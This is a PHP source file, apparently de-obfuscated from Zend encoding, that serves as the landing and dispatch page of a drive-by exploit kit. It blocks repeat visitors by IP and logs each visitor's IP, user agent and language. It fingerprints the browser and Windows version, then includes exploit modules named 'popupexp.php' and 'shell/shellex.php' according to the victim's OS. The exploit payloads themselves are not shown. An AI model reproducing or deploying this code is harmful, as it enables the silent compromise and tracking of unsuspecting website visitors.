<?php
/************************/
/*                      */
/*Dezended By Martian   */
/*munir.skilledsoft.com */
/*                      */
/*                      */
/************************/

include( "inc.config.php" );
include( "lib/lib.placeholder.php" );
include( "lib/block.php" );
//include( "lib/crypt.php" );
if ( !mysql_connect( $db_host, $db_user, $db_pass ) )
{
    exit( "Couldn't connect to db!" );
}
if ( !mysql_select_db( $db_name ) )
{
    exit( "DB \"".$db_name."\" not found!" );
}
$ip = getenv( "REMOTE_ADDR" );
$sql = sql_placeholder( "SELECT * FROM tp_stats WHERE ip = ? AND datetime > ?", $ip, date( "Y-m-d H:i:s", time( ) - $timeout ) );
$r = mysql_query( $sql );
$num = mysql_num_rows( $r );
if ( 0 < $num )
{
    $sql = "UPDATE tp_hits set total = total + 1";
    mysql_query( $sql );
    echo "<center><b>You IP is blocked!!!</b></center><script type=\"text/javascript\" src=\"lib/close.js\"></script>";
    exit( );
}
$user_agent = getenv( "HTTP_USER_AGENT" );
$uri = getenv( "REQUEST_URI" );
$accept_lang = getenv( "HTTP_ACCEPT_LANGUAGE" );
if ( strstr( $user_agent, "Nav" ) )
{
    $browser = "Netscape";
}
else if ( strstr( $user_agent, "Lynx" ) )
{
    $browser = "Lynx";
}
else if ( strstr( $user_agent, "Opera" ) )
{
    $browser = "Opera";
}
else if ( strstr( $user_agent, "WebTV" ) )
{
    $browser = "WebTV";
}
else if ( strstr( $user_agent, "Konqueror" ) )
{
    $browser = "Konqueror";
}
else if ( strstr( $user_agent, "Bot" ) )
{
    $browser = "Bot";
}
else if ( strstr( $user_agent, "MSIE" ) )
{
    $browser = "MSIE";
}
else
{
    $browser = "other";
}
if ( strstr( $user_agent, "Windows 95" ) )
{
    $os = "Windows 95";
}
else if ( strstr( $user_agent, "Windows NT 4" ) )
{
    $os = "Windows NT 4";
}
else if ( strstr( $user_agent, "Win 9x 4.9" ) )
{
    $os = "Windows ME";
}
else if ( strstr( $user_agent, "Windows 98" ) )
{
    $os = "Windows 98";
}
else if ( strstr( $user_agent, "Windows NT 5.0" ) )
{
    $os = "Windows 2000";
}
else if ( strstr( $user_agent, "SV1" ) )
{
    $os = "Windows XP SP2";
}
else if ( strstr( $user_agent, "Windows NT 5.1" ) )
{
    $os = "Windows XP";
}
else if ( strstr( $user_agent, "Windows NT 5.2" ) )
{
    $os = "Windows 2003";
}
else
{
    $os = "other";
}
$sql = sql_placeholder( "INSERT INTO tp_stats(datetime, ip, user_agent, browser, os, uri, accept_lang) VALUES(?, ?, ?, ?, ?, ?, ?)", date( "Y-m-d H:i:s" ), $ip, $user_agent, $browser, $os, $uri, $accept_lang );
mysql_query( $sql );
if ( $os == "Windows 95" || $os == "Windows NT 4" || $os == "Windows ME" || $os == "Windows 98" || $os == "Windows 2000" || $os == "Windows 2003" || $os == "Windows XP" )
{
    echo "<html>\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\r\n<title></title>\r\n</head><body bgcolor=snow>\r\n";
    include( "mod/ok.php" );
    echo "<br>\r\n";
    include( "mod/popupexp.php" );
    echo "<br>\r\n";
    include( "mod/shell/shellex.php" );
    echo "<br>\r\n\r\n";
}
else if ( $os == "Windows XP SP2" )
{
    echo "<html>\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\r\n<title></title>\r\n</head><body bgcolor=snow>\r\n";
    include( "mod/ok.php" );
    echo "<br>\r\n";
    include( "mod/shell/shellex.php" );
    echo "<br>\r\n\r\n";
}
else
{
    echo "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\r\n<title></title></head><body bgcolor=snow>\r\n";
    include( "mod/ok.php" );
    echo "<br>\r\n";
    include( "mod/popupexp.php" );
    echo "<br>\r\n";
    include( "mod/shell/shellex.php" );
    echo "<br>\r\n";
}
echo "</body></html>";
?>
